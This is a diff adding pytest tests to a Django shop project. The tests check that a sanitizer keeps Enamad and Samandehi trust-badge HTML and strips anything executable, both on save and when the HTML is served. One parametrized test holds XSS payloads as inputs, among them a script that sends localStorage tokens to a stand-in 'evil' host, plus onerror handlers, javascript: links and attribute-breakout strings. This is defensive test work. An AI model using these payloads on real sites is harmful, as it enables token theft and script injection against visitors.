@@ -239,3 +239,74 @@ class TestLoginIdentifiers:
         res = APIClient().post(login, {"username": "sara@example.com", "password": "otherpass123"})
         assert res.status_code == 200 and res.data["user"]["id"] == older.id
         assert APIClient().post(login, {"username": "sara@example.com", "password": "wrongpass123"}).status_code == 400
+
+
+ENAMAD = (
+    "<a referrerpolicy='origin' target='_blank' href='https://trustseal.enamad.ir/?id=123&Code=AbC'>"
+    "<img referrerpolicy='origin' src='https://trustseal.enamad.ir/logo.aspx?id=123&Code=AbC' alt='' "
+    "style='cursor:pointer' code='AbC'></a>"
+)
+SAMANDEHI = (
+    "<img referrerpolicy='origin' id='rgvjfukz' style='cursor:pointer' "
+    "onclick='window.open(\"https://logo.samandehi.ir/Verify.aspx?id=9&p=xl\", \"Popup\",\"toolbar=no\")' "
+    "alt='logo-samandehi' src='https://logo.samandehi.ir/logo.aspx?id=9&p=nb'/>"
+)
+
+
+class TestBadgeHtml:
+    def test_enamad_badge_keeps_its_link_picture_and_code(self):
+        from orders.badge_html import clean_badge_html
+
+        assert clean_badge_html(ENAMAD) == (
+            '<a referrerpolicy="origin" target="_blank" href="https://trustseal.enamad.ir/?id=123&amp;Code=AbC" '
+            'rel="noopener"><img referrerpolicy="origin" '
+            'src="https://trustseal.enamad.ir/logo.aspx?id=123&amp;Code=AbC" alt="" code="AbC"></a>'
+        )
+
+    def test_samandehi_onclick_becomes_a_plain_link(self):
+        from orders.badge_html import clean_badge_html
+
+        cleaned = clean_badge_html(SAMANDEHI)
+        assert cleaned.startswith('<a href="https://logo.samandehi.ir/Verify.aspx?id=9&amp;p=xl" target="_blank"')
+        assert 'src="https://logo.samandehi.ir/logo.aspx?id=9&amp;p=nb"' in cleaned and cleaned.endswith("</a>")
+        assert "onclick" not in cleaned and "window.open" not in cleaned
+
+    @pytest.mark.parametrize("payload, cleaned", [
+        ("<script>fetch('https://evil/'+localStorage.tokens)</script>", ""),
+        ("<img src=x onerror=alert(1)>", ""),
+        ("<img src='https://ok/a.png' onerror='alert(1)' onload=alert(2)>", '<img src="https://ok/a.png">'),
+        ("<a href='javascript:alert(1)'>x</a>", '<a rel="noopener"></a>'),
+        ("<a href=' JaVaScRiPt:alert(1)'><img src='data:image/svg+xml,<svg onload=alert(1)>'></a>",
+         '<a rel="noopener"></a>'),
+        ("<svg onload=alert(1)><iframe src='https://evil'></iframe><style>*{display:none}</style>", ""),
+        ("<a href='https://ok/' style='position:fixed;inset:0'>click</a><form action='https://evil'><input></form>",
+         '<a href="https://ok/" rel="noopener"></a>'),
+        # Quotes inside a value can't close the attribute and start a new tag.
+        ("<img src=\"https://ok/a.png\" alt='\"><script>alert(1)</script>'>",
+         '<img src="https://ok/a.png" alt="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">'),
+        ("<a href='https://ok/\"onmouseover=alert(1) x=\"'>", '<a rel="noopener"></a>'),
+    ])
+    def test_nothing_that_runs_survives(self, payload, cleaned):
+        from orders.badge_html import clean_badge_html
+
+        assert clean_badge_html(payload) == cleaned
+
+    @pytest.mark.django_db
+    def test_settings_are_cleaned_on_save_and_on_the_way_out(self):
+        from orders.models import ShopSettings
+
+        staff = User.objects.create_superuser(phone="09125550030", password="securepass123")
+        client = APIClient()
+        client.force_authenticate(staff)
+        res = client.patch(
+            reverse("orders:admin-settings"),
+            {"enamad_html": ENAMAD + "<script>alert(1)</script>", "samandehi_html": "<img src=x onerror=alert(1)>"},
+            format="json",
+        )
+        assert res.status_code == 200
+        shop = ShopSettings.load()
+        assert "<script" not in shop.enamad_html and "trustseal.enamad.ir" in shop.enamad_html
+        assert shop.samandehi_html == ""
+        # A row written before the cleaning existed is still safe for visitors.
+        ShopSettings.objects.filter(pk=1).update(samandehi_html="<img src=x onerror=alert(1)>")
+        assert APIClient().get(reverse("orders:shop-info")).data["samandehi_html"] == ""
